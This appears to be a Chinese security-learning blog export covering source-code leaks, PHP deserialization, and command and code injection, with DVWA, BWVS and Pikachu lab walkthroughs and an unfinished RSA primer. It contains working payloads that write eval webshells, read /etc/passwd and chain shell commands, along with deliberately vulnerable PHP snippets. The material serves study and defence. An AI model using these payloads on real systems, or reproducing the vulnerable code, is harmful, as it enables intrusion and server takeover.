2.查找服务器上所有.svn隐藏文件夹，删除 以下命令删除当前目录下.svn文件夹find . -type d -name \".svn\"|xargs rm -rfrm -rf `find . -type d -name .svn`find . -name \".svn\" -type d | xargs rm -frfind . -name \".svn\" -type d | xargs -n1 rm -R 使用脚本删除#!/bin/shcd /home/web/find ./ -name \".svn\" |xargs -n1 echo &gt; /dev/null 2&gt;&amp;1find ./ -name \".svn\" -print0 | xargs -0 rm -frif [ $? -ne 0 ]; thenecho \"remove .svn dirs failed!\"fi 以上文件保存为.sh执行之后，会删除 /home/web目录及其子目录中 所有 .svn 隐藏文件夹。 3.在使用SVN时，严格使用导出功能。禁止直接复制代码 0x04 .CVS信息泄漏CVS是一个年代比较久远的版本控制系统, 通过它可以追踪源代码的历史变化记录，但是因为功能比较简单, 而且不支持分支, 所以很早前就被上面提到的svn替代了。 1、漏洞成因 cvs项目在初始化(cvs checkout project)的时候, 会在project目录下创建一个名为CVS的目录,其中保存了各个文件的修改和commit记录.。通过此目录可以获取代码的历史版本.。其中两个关键文件为:CVS/Root和CVS/Entries, 分别记录了项目的根信息和所有文件的结构。 2、漏洞利用 测试的目录 http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构 取回源码的命令 bk clone http://url/name dir 命令的意思就是把远端一个名为name的repo，clone到本地名为dir的目录下。查看所有的改变的命令，转到download的目录 bk changes 工具dvcs-ripper rip-cvs.pl -v -u http://www.example.com/CVS/ 3、修复建议 1.在目标服务器上删除CVS相关目录2.限制对CVS相关目录的访问。 0x05 .DS_Store文件泄漏.DS_Store 文件 MAC 系统是用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。如果用户删除以后的副作用就是这些信息的失去。这些文件本来是给 Finder 使用的，但它们被设想作为一种更通用的有关显示设置的元数据存储，诸如图标位置和视图设置。 1、漏洞成因 当需要把代码上传的时候，安全正确的操作应该把 .DS_Store 文件删除才正确。因为里面包含了一些目录信息，如果没有删除，攻击者通过 .DS_Store 可以知道这个目录里面所有文件名称，从而让攻击者掌握了更多的信息。 在发布代码时未删除文件夹中隐藏的 .DS_store，被发现后，获取了敏感的文件名等信息。攻击者可以利用访问 URL(http://www.example.com/.ds_store)的方式来判断，是否存在DS_store泄露，如果存在泄漏，使用工具dsstoreexp，就可以下载源码。 2、漏洞利用 工具dsstoreexp python ds_store_exp.py http://www.example.com/.DS_Store 3、修复建议 1.删除.Ds_Store文件* find . -name '*.DS_Store' -type f -delete 2.禁止.DS_Store文件的生成 defaults write com.apple.desktopservices DSDontWriteNetworkStores -bool TRUE 恢复.DS_Store文件的生成defaults delete com.apple.desktopservices DSDontWriteNetworkStores git中对.DS_Store文件的操作删除项目中的所有.DS_Store。这会跳过不在项目中的 .DS_Store1.find . -name .DS_Store -print0 | xargs -0 git rm -f --ignore-unmatch将 .DS_Store 加入到 .gitignore2.echo .DS_Store &gt;&gt; ~/.gitignore更新项目3.git add --all4.git commit -m '.DS_Store banished!' 0x06 .bzr源码泄露bzr，即Bazaar。也是个版本控制工具, 虽然不是很热门, 但它也是多平台支持, 并且有不错的图形界面,所以也有一些人认为bzr比git要好用。 1、漏洞成因 bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为.bzr的隐藏目录, 同样暴露了源代码和用户信息 2、漏洞利用 bzr revert命令 wget -r --no-parent --mirror http://www.example.com/.bzrcd www.example.com &amp;&amp; bzr revert 工具dsstoreexp rip-bzr.pl -v -u http://www.example.com/.bzr/ 3、修复建议 删除.bzr文件(同.git) 0x07 网站备份压缩文件在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。 1、漏洞成因 服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。 编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。 该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。 2、漏洞利用 在 URL 加上域名+网站备份文件名 +压缩包后缀 也就是 URL，下载网站源码。部分常见的网站备份文件后缀名： .rar .zip .7z .tar.gz .bak .swp .txt 部分常见的备份文件名： www back backup web temp data website 新建文件夹 3、修复建议 把备份文件删除或移出web根目录 0x08 WEB-INF/web.xml 泄露WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。WEB-INF主要包含一下文件或目录： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。 /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件 /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。 /WEB-INF/database.properties：数据库配置文件 1、漏洞成因 通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。 2、漏洞利用 通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来 3、修复建议 修改Nginx配置文件禁止访问WEB-INF目录location ~ ^/WEB-INF/* &#123; deny all; &#125; 或者return 404; 或者其他！ 参考博客：谈谈源码泄露 · WEB 安全常见Web源码泄露总结","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"源码泄露","slug":"源码泄露","permalink":"https://qwzf.gitee.io/blog/tags/源码泄露/"}],"author":"qwzf"},{"title":"PHP反序列化漏洞","slug":"PHP反序列化漏洞","date":"2019-08-14T15:29:51.682Z","updated":"2019-08-15T12:15:24.942Z","comments":true,"path":"2019/08/14/PHP反序列化漏洞/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/08/14/PHP反序列化漏洞/","excerpt":"","text":"前言最近又学习了新的漏洞知识——PHP反序列化漏洞，学习之余总结一下。 什么是php反序列化漏洞漏洞简介php反序列化漏洞，又叫php对象注入漏洞。简单来讲，就是在php反序列化的时候，反序列化的内容是用户可控，那么恶意用户就可以构造特定序列化内容的代码，通过unserialize()函数进行特定的反序列化操作，并且程序的某处存在一些敏感操作是写在类中的，那么就可以通过这段恶意代码，达到执行攻击者想要的操作。 漏洞形成原因漏洞的形成的根本原因是程序没有对用户输入的反序列化字符串进行检测，导致反序列化过程可以被恶意控制，进而造成代码执行、getshell等一系列不可控的后果。 但还是先了解一下php类与对象、php序列化和反序列化和魔术方法的相关知识。 php类与对象类的声明[修饰类的关键字] class 类名 &#123; 成员属性 成员方法&#125; （1）成员属性，在类中声明的变量，称为成员属性。声明时，变量前面必须使用一个关键字，如使用public、private、static等关键字修饰，如不需要有特殊意义的修饰，则可使用var关键字（2）成员方法，在类中声明的函数，称为成员方法。 通过类实例化对象类创建后，可以使用 new 运算符来实例化该类的对象。$变量名 = new 类名称; 对象引用$this成员方法属于哪个对象，$this引用就代表哪个对象。例：&lt;?phpclass Person &#123; public $name; function say()&#123; echo '我的名字是'.$this-&gt;name; &#125;&#125;$xm = new Person; //实例化对象$xm-&gt;name = '小明'; //对象属性的赋值$xm-&gt;say(); //访问对象的成员方法?&gt; 构造方法构造方法的作用是为成员属性初始化；构造方法是在对象创建完后，第一个自动调用的方法；构造方法，方法名固定，在PHP4中构造方法名与类名一致；PHP5中是 __construct()析构方法当对象被释放之前最后一个自动调用的方法。作用：关闭一些资源，做一个清理工作。名称：__destruct()例：&lt;?phpclass Person &#123; public $name; function __construct($name='')&#123; echo \"构造函数被调用\".\"&lt;br&gt;\"; $this-&gt;name = $name; &#125; function say()&#123; echo $this-&gt;name; &#125; function __destruct()&#123; echo \"&lt;br&gt;\".\"析构函数被调用\"; &#125;&#125;$car = new Person(); //当创建一个对象的时候，类中的构造函数就会被调用$car-&gt;name = '小明 '; //对象属性的赋值$car-&gt;say(); //访问对象的成员方法unset($car); //unset可以销毁对象，当销毁对象的时候就会调用类中的析构函数?&gt; php序列化与反序列化序列化：serialize 把一个对象转成字符串形式， 可以用于保存。函数 : serialize()把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等。序列化一个对象将会保存对象的所有变量，但是不会保存对象的方法，只会保存类的名字。测试代码：&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class1 = new chybeta;$class1_ser = serialize($class1);print_r($class1_ser);?&gt; 将其序列化后的结果： O代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a 7表示对象的名称有7个字符 &quot;chybeta&quot;表示对象的名称 1表示有一个值 {s:4:&quot;test&quot;;s:3:&quot;123&quot;;}中，s表示字符串，4表示该字符串的长度，”test”为字符串的名称，之后的类似 php允许保存一个对象方便以后重用，这个过程被称为序列化。反序列化:unserialize 把serialize序列化后的字符串变成一个对象。函数: unserialize()可以从已存储的表示中创建PHP的值。恢复原先被序列化的变量。测试代码：&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class2 = 'O:7:\"chybeta\":1:&#123;s:4:\"test\";s:3:\"123\";&#125;';print_r($class2);echo \"&lt;/br&gt;反序列化结果为：&lt;/br&gt;\";$class2_unser = unserialize($class2);print_r($class2_unser);?&gt; 将其反序列化后的结果： 魔术方法magic 函数php面向对象变成中，有一类函数叫做magic function，魔术函数。这些函数是以(双下划线)开头的，他们是一些当依照某些规则实例化类或者调用某些函数的时候会自动调用这些magic函数，这里有一些比较常见的例如construct，destory，sleep，wakeup，__toString函数。 __construct()：创建一个对象时会被调用。 __destruct()：销毁一个对象时会被调用。 __wakeup()：触发unserialize()方法时会被调用。 __sleep()：触发serialize()方法时会被调用。 __toString()：类对象被当作一个字符串使用时会被调用。 __get()：调出不可访问（private，protect等修饰）属性时会被调用。 __set()：修改或写入不可访问（private，protect等修饰）属性时会被调用。 __isset()：对不可访问（private，protect等修饰）属性使用empty()或isset()方法时会被调用。 __unset()：对不可访问（private，protect等修饰）属性使用unset()方法时会被调用。 __invoke()：将实例化对象当作方法使用时会被调用。 php反序列化漏洞1、wakeup()或destruct()的利用基本思路本地搭建好环境，通过 serialize() 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “&lt;?php @eval($_POST[a]);?&gt;”,再调用unserialize()时会通过wakeup()把test的写入到webshell.php中。利用unserialize()后会导致wakeup() 或__destruct()的直接调用，中间无需其他过程。所以在本地搭建环境，index1源码为：&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen(\"webshell.php\",\"w\") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class3 = $_GET['test'];print_r($class3);echo \"&lt;/br&gt;\";$class3_unser = unserialize($class3);require \"webshell.php\";// 为显示效果，把这个shell.php包含进来?&gt; 编写exp之后用serialize函数进行序列化&lt;?phpclass chybeta&#123; var $test = '&lt;?php @eval($_POST[a]);?&gt;';&#125;$class1 = new chybeta;$class1_ser = serialize($class1);print_r($class1_ser);?&gt; 得到payloadO:7:\"chybeta\":1:&#123;s:4:\"test\";s:25:\"&lt;?php @eval($_POST[a]);?&gt;\";&#125; 测试一下，测试成功并且将一句话木马写入到了webshelll.php文件 2、其他Magic函数的利用基本思路向test传入构造好的序列化字符串后，进行反序列化时自动调用 wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的construct()方法，从而把&lt;?php @eval($_POST[a]);?&gt;写入到 webshell.php中。利用有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象。在本地搭建环境(删除之前webshell.php里的内容)，index2源码为：&lt;?phpclass ph0en1x&#123; function __construct($test)&#123; $fp = fopen(\"webshell.php\",\"w\"); fwrite($fp,$test); fclose($fp); &#125;&#125;class chybeta&#123; var $test = '123'; function __wakeup()&#123; $obj = new ph0en1x($this-&gt;test); &#125;&#125;$class5 = $_GET['test'];print_r($class5);echo \"&lt;/br&gt;\";$class5_unser = unserialize($class5);require \"webshell.php\";?&gt; 编写exp之后，用serialize函数进行序列化，得到payloadO:7:\"chybeta\":1:&#123;s:4:\"test\";s:25:\"&lt;?php @eval($_POST[a]);?&gt;\";&#125; 并将一句话木马写入到了webshelll.php文件 3、普通成员的利用基本思路new一个新的chybeta对象后，调用construct()，其中又new了ph0en1x对象。在结束后会调用destruct()，其中会调用action()，从而输出 ph0en1x。利用前面的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能通过“自动调用”来达到目的。这时，要寻找相同的函数名，把敏感函数和类联系在一起。&lt;?phpclass chybeta &#123; var $test; function __construct() &#123; $this-&gt;test = new ph0en1x(); &#125; function __destruct() &#123; $this-&gt;test-&gt;action(); &#125;&#125;class ph0en1x &#123; function action() &#123; echo \"ph0en1x\"; &#125;&#125;class ph0en2x &#123; var $test2; function action() &#123; eval($this-&gt;test2); &#125;&#125;$class6 = new chybeta();unserialize($_GET['test']);?&gt; 构造序列化&lt;?phpclass chybeta &#123; var $test; function __construct() &#123; $this-&gt;test = new ph0en2x(); &#125;&#125;class ph0en2x &#123; var $test2 = '@eval($_POST[a]);';&#125;echo serialize(new chybeta());?&gt; 得到payload：O:7:\"chybeta\":1:&#123;s:4:\"test\";O:7:\"ph0en2x\":1:&#123;s:5:\"test2\";s:17:\"@eval($_POST[a]);\";&#125;&#125; 传给index.php的test参数蚁剑测试一下，测试成功参考博客：浅谈php反序列化漏洞PHP反序列化漏洞与防御 php反序列化漏洞靶场实战靶场环境皮卡丘：https://github.com/zhuifengshaonianhanlu/pikachu 开始实验先输入个1，抓包查看发现传参方式为post型，且参数变量为o其他没有有用信息。emmm。。查看源码吧！发现有用信息了。先编写exp之后，然后用serialize函数进行序列化。因为是post传参，所以就不演示一句话了，并且根据源码phpinfo();也不行。直接xss弹框试一下&lt;?phpclass S&#123; var $test = &apos;&lt;script&gt;alert(&apos;xss&apos;)&lt;/script&gt;&apos;;&#125;$class1 = new S;$class1_ser = serialize($class1);print_r($class1_ser);?&gt; 得到payloadO:1:\"S\":1:&#123;s:4:\"test\";s:29:\"&lt;script&gt;alert('xss')&lt;/script&gt;\";&#125; 成功 感悟了解了php类与对象、反序列化和序列化和反序列化漏洞的成因。同时也学会了php反序列化漏洞的三种利用方式。继续学习，小白进阶ing。","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"反序列化漏洞","slug":"反序列化漏洞","permalink":"https://qwzf.gitee.io/blog/tags/反序列化漏洞/"}],"author":"qwzf"},{"title":"命令执行(Command Injection)与代码执行(Code execution)","slug":"命令执行(Command Injection)与代码执行(Code execution)","date":"2019-08-08T15:11:51.661Z","updated":"2019-10-27T15:16:26.193Z","comments":true,"path":"2019/08/08/命令执行(Command Injection)与代码执行(Code execution)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/08/08/命令执行(Command Injection)与代码执行(Code execution)/","excerpt":"","text":"前言Web学习进行时，最近又学习了命令执行和代码执行漏洞。于是记录了学习过程。 命令执行与代码执行基础简介命令执行漏洞命令执行漏洞概念：命令执行漏洞，就是指用户通过浏览器或其他辅助程序提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。 通俗的讲：当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system、exec、shell_exec等，当用户可以控制命令执行函数中的参数时，将可以住人恶意系统命令到正常的命令中，造成命令执行攻击。命令执行漏洞成因：当我们开发的应用需要一些除去web的特殊功能时，就需要调用一些外部程序。命令执行漏洞：直接调用操作系统命令命令执行漏洞原理：在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。命令执行相关函数本质：命令执行产生函数：exec，shell_exec，system，passthru等将参数以dos、shell执行 exec()、system()、popen()、passthru()、proc_open()、pcntl_exec()、shell_exec() 、反引号` 实际上是使用shell_exec()函数，此外还要小心mail()函数的安全。 system() 输出并返回最后一行shell结果。 exec() 不输出结果，返回最后一行shell结果，所有结果可以保存到一个返回的数组里面。 passthru() 只调用命令，把命令的运行结果原样地直接输出到标准输出设备上。 popen()、proc_open() 不会直接返回执行结果，而是返回一个文件指针 命令执行分隔符：windows： &amp;&amp; || &amp; | linux： &amp;&amp; || &amp; | ; windows：| 直接执行后面的语句 ping 127.0.0.1|whoami|| 前面出错执行后面的 ，前面为假 ping 2 || whoami&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoamiLinux：; 前面的执行完执行后面的 ping 127.0.0.1;whoami| 管道符，显示后面的执行结果 ping 127.0.0.1|whoami|| 当前面的执行出错时执行后面的 ping 1||whoami&amp; 前面的语句为假则直接执行后面的,前面可真可假 ping 127.0.0.1&amp;whoami&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真 ping 127.0.0.1&amp;&amp;whoami命令执行漏洞利用：1、可尝试进行反弹shell，搭建服务执行wget下载webshell。2、写入webshell:利用命令注入写一句话php webshell到web目录涉及到一些特殊字符的转义假设需要写入&lt;?php eval($_POST[kang]); ?&gt;，方法如下：Windows：用^转义&lt;，即执行echo ^&lt;?php eval($_POST[kang]); ?^&gt; &gt; webweb可写目录加文件完整名字Linux：linux下需要用\\来转义&lt;，不过很多php都默认开启gpc(魔术引号magic_quotes_gpc()）。可以先用16进制转换一句话再用xxd命令把16进制还原，命令如下：echo 3c3f706870206576616c28245f504f53545b6b616e675d293b203f3e|xxd -r -ps &gt; webweb可写目录加文件完整名字 后面命令注入也有时间盲注和sql注入很像命令执行漏洞修复建议： 尽量不使用命令执行函数 提交的变量在进入执行命令函数前进行过滤和检测(如：调用addslashes进行转义) 使用动态函数之前，确保使用的函数是指定的函数之一 对于PHP语言，不能完全控制的危险函数(如：disable_functions)最好不使用 PHP内置的两个函数可以有效防止命令执行：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。资料参考：http://cn.php.net/manual/zh/function.escapeshellarg.php escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。资料参考：http://cn.php.net/manual/zh/function.escapeshellcmd.php 代码执行漏洞代码执行漏洞成因：应用程序在调用一些能够将字符串转换为代码的函数（如PHP中的eval）时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞。大部分都是根据源代码判断代码执行漏洞。代码执行漏洞：靠执行脚本代码调用操作系统命令代码执行漏洞原理：应用有时需要调用一些执行系统命令的函数，如PHP中的system、exec、shell_exec、passthru、popen、proc_popen等，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击，这就是命令执行漏洞。代码执行相关函数： PHP: eval、assert、preg_replace()、+/e模式（PHP版本&lt;5.5.0） Javascript: eval Vbscript：Execute、Eval Python: exec Java: Java中没有php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL等，这些都能造成代码执行漏洞。 代码执行漏洞的案例： 可控点为待执行的程序。 &lt;?php$data = $_GET[‘data’];eval (“\\$ret = $data;”);echo $ret;?&gt; 使用：直接传入我们想要执行的PHP代码。 可控点某函数的参数值且被单引号包裹。&lt;?php$data = $_GET[‘data’];eval (“\\$ret = strtolower(‘$data’);”);echo $ret;?&gt; 使用：必须先闭合单引号。Pl：’);所需函数;// 可控点某函数的参数值且被双引号包裹。&lt;?php$data = $_GET[‘data’];eval (“\\$ret = strtolower(“\\’’$_data\\”);”);echo $ret;?&gt; Pl: {${所需函数}}“);所需函数;//在PHP中，双引号里面如果包含有变量，PHP解释器会将其替换为变量解释后的结果；单引号中的变量不会被处理。 preg_replace()+/e(PHP版本&lt;5.5.0) &lt;?php$data = $_GET[‘data’];preg_repalce(‘/&lt;data&gt;(.*)&lt;\\ /data&gt;/e’, ’$ret=”\\\\1”;’ $data);echo $ret;?&gt; {${所需函数}}/e 修正符/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。 代码执行漏洞利用：1.一句话木马 $&#123;@eval($_POST[1])&#125; 2.获取当前工作路径 $&#123;exit(print(getcwd()))&#125; 使用菜刀3.读文件 $&#123;exit(var_dump(file_get_contents($_POST[f])))&#125;f=/etc/passwd 使用post提交数值 f=/etc/passwd4.写webshell $&#123;exit(var_dump(file_put_contents($_POST[f], $_POST[d])))&#125;f=1.php&amp;d=1111111 同样使用post代码执行漏洞修复方案： 对于eval()函数一定要保证用户不能轻易接触eval参数或者用正则严格判断输入的数据格式。 对于字符串一定要使用单引号包裹可控代码，并且插入前进行addslashes 对于preg_replace放弃使用e修饰符.如果必须要用e修饰符，请保证第二个参数中，对于正则匹配出的对象，用单引号包裹。 基础环境搭建搭建使用Web服务器环境(Apache+PHP+MySQL、我用的phpstudy集成环境)命令执行环境新建一个commnd.php文件，其中输入代码：&lt;?php$a=$_GET['cmd'];if ($a)&#123; system(\"$a\");&#125;?&gt; 测试一下报错是因为没有get传参。get传参测试是否成功(如果显示编码有问题，可以设置编码)这种操作相当于在命令行（cmd）下进行ipconfig的查询。代码执行环境新建code.php,输入代码：&lt;?php eval($_REQUEST['code']);?&gt; 在浏览器中打开，传参(get或post都行)，参数值我选择phpinfo();效果和查看phpinfo.php是一样的。 DVWA漏洞靶场-Command Injection(命令执行)1、low 级别127.0.0.1 &amp; ipconfig 没有任何过滤，执行成功stristr(string,search,before_search)stristr函数搜索字符串在另一字符串中的第一次出现，返回字符串的剩余部分（从匹配点），如果未找到所搜索的字符串，则返回 FALSE。参数string规定被搜索的字符串，参数search规定要搜索的字符串（如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符），可选参数before_true为布尔型，默认为“false” ，如果设置为 “true”，函数将返回 search 参数第一次出现之前的字符串部分。php_uname(mode)这个函数会返回运行php的操作系统的相关描述，参数mode可取值”a” （此为默认，包含序列”s n r v m”里的所有模式）”s ”（返回操作系统名称）”n”（返回主机名）”r”（返回版本名称）”v”（返回版本信息） ”m”（返回机器类型）可以看到，服务器通过判断操作系统执行不同ping命令，但是对ip参数并未做任何的过滤，导致了严重的命令注入漏洞。 2、medium 级别查看源码设置了黑名单，对 &amp;&amp; ； 进行了过滤，替换成空单 &amp; 或者 || 可绕过，即：127.0.0.1 &amp; ipconfig 或127.0.0.1 || ipconfig 3、high 级别查看源码更加严格过滤，对黑名单中所有字符进行替换，&amp;&amp; 会被替换两次过滤了 | + 空格，使用无空格|绕过，即可执行成功。即：127.0.0.1|ipconfig 4、impose 级别查看源码stripslashes(string)stripslashes函数会删除字符串string中的反斜杠，返回已剥离反斜杠的字符串。explode(separator,string,limit)把字符串打散为数组，返回字符串的数组。参数separator规定在哪里分割字符串，参数string是要分割的字符串，可选参数limit规定所返回的数组元素的数目。is_numeric(string)检测string是否为数字或数字字符串，如果是返回TRUE，否则返回FALSE。 限制IP格式，这就是所谓的白名单，可以有效的防止命令注入。不推荐黑名单，应该可以通过双引号，略过黑名单。linux下还支持单引号 BWVS漏洞靶场-代码执行1、一句话木马http://192.168.204.128/BWVS//bug/code_exec/code.php?code=$&#123;@eval($_POST['a'])&#125;&amp;submit=submit 2、获取当前工作路径http://192.168.204.128/BWVS//bug/code_exec/code.php?code= $&#123;exit(print(getcwd()))&#125;&amp;submit=submit 3、读文件$&#123;exit(var_dump(file_get_contents($_POST[f])))&#125;f=/etc/passwd 4、写webshell$&#123;exit(var_dump(file_put_contents($_POST[f], $_POST[d])))&#125;f=webshell.php&amp;d=&lt;?php @eval($_POST['abc']); ?&gt; 测试是否上传成功，上传成功 参考：DVWA漏洞靶场-命令执行(Command Injection)代码执行漏洞PHP安全之慎用preg_replace的/e修饰符《Web安全攻防》命令执行、代码执行漏洞 感悟通过学习命令执行和代码执行。又收获了好多知识，继续努力！！！小白进阶ing","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"命令执行与代码执行","slug":"命令执行与代码执行","permalink":"https://qwzf.gitee.io/blog/tags/命令执行与代码执行/"}],"author":"qwzf"},{"title":"Crypto-RSA加密","slug":"Crypto-RSA加密","date":"2019-08-06T15:16:34.661Z","updated":"2019-08-12T09:36:57.325Z","comments":true,"path":"2019/08/06/Crypto-RSA加密/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/08/06/Crypto-RSA加密/","excerpt":"","text":"前言最近学习了RSA加密原理，并且做了些有关RSA的Crypto题。收获很大，总结了一下 一、对称加密和非对称加密对称加密算法（1）甲方选择某一种加密规则，对信息进行加密；（2）乙方使用同一种规则，对信息进行解密。 最大弱点：甲方必须把加密规则告诉乙方，否则无法解密。保存和传递密钥，就成了最头疼的问题。非对称加密算法 （1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。（2）甲方获取乙方的公钥，然后用它对信息加密。（3）乙方得到加密后的信息，用私钥解密。 公钥加密的信息只有私钥解得开，那么只要私钥不泄漏，通信就是安全的 二、RSA基本介绍介绍 RSA加密算法是一种非对称加密算法。在公开密钥加密和电子商业中RSA被广泛使用。 对极大整数做因数分解的难度决定了RSA算法的可靠性。换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。现在只有短的RSA钥匙才可能被强力方式解破。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。 RSA签名验签使用私钥将明文进行签名生成密文串与明文一起传输。对方收到数据后使用公钥和密文串进行验签。如果验签通过就说明就说明第一数据没有被修改过；第二这些数据一定是持有私钥的人发送的，因为私钥只有自己持有，起到防抵赖的作用。 三、RSA数学知识1、互质关系如果两个正整数，除了1之外没有其他公因子，我们称这两个数是互质关系。不是质数也可以构成互质关系。关于互质关系，有以下结论： 任意两个质数构成互质关系，比如13和61. 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10. 如果两个数中，较大的那个数是质数，则两者构成互质关系，比如97和57. 1和任意一个自然数都是互质关系。 p是大于1的整数，则p和p-1构成互质关系，比如57和56. p是大于1的奇数，则p和p-2构成互质关系，比如17和15. 2、欧拉函数任意给定正整数n,计算在小于等于n的正整数之中，有多少个与n构成互质关系。计算这个值的方法叫做欧拉函数。以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。 如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。 如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。 如果n是质数的某一个次方，即 n = p^k (p为质数，k为大于等于1的整数)，则比如 φ(8) = φ(2^3) =2^3 - 2^2 = 8 -4 = 4。这是因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有p^(k-1) 个，即1×p、2×p、3×p、…、p^(k-1)×p，把它们去除，剩下的就是与n互质的数。上面的式子还可以写成下面的形式：可以看出，上面的第二种情况是 k=1 时的特例。 如果n可以分解成两个互质的整数之积，n = p1 × p2则φ(n) = φ(p1p2) = φ(p1)φ(p2)即积的欧拉函数等于各个因子的欧拉函数之积。比如，φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。 因为任意一个大于1的正整数，都可以写成一系列质数的积。根据第4条的结论，得到再根据第3条的结论，得到也就等于这就是欧拉函数的通用计算公式。比如，1323的欧拉函数，计算过程如下：φ(1323)=φ(3^2 * 7^2)=1323(1-1/3)(1-1/7)=756 3、欧拉定理如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：也就是说，a的φ(n)次方被n除的余数为1。或者说，a的φ(n)次方减去1，可以被n整除。比如，3和7互质，而7的欧拉函数φ(7)等于6，所以3的6次方（729）减去1，可以被7整除（728/7=104）。 如果正整数a与质数p互质，应为φ(p)=p-1，所以欧拉函数可写成：这是著名的费马小定理。它是欧拉定理的特例。欧拉定理是RSA算法的核心。 4、模反元素如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除。比如：3和11互质，那么3的模反元素是4，应为3*4-1 可以被11整除。4加减11的整数倍数都是3的模反元素。欧拉定理可以用来证明模反元素必然存在：a的φ(n)-1次方，就是a的模反元素 四、RSA算法 1、公钥和私钥的生成RSA算法之一种非对称加密算法。具体的加密工程如下：使用A和他的小伙伴B来举例子。假设A想通过一个不可靠的媒体接受B的一条私人消息，他可以用下面的方式产生一个公钥和私钥。 1. 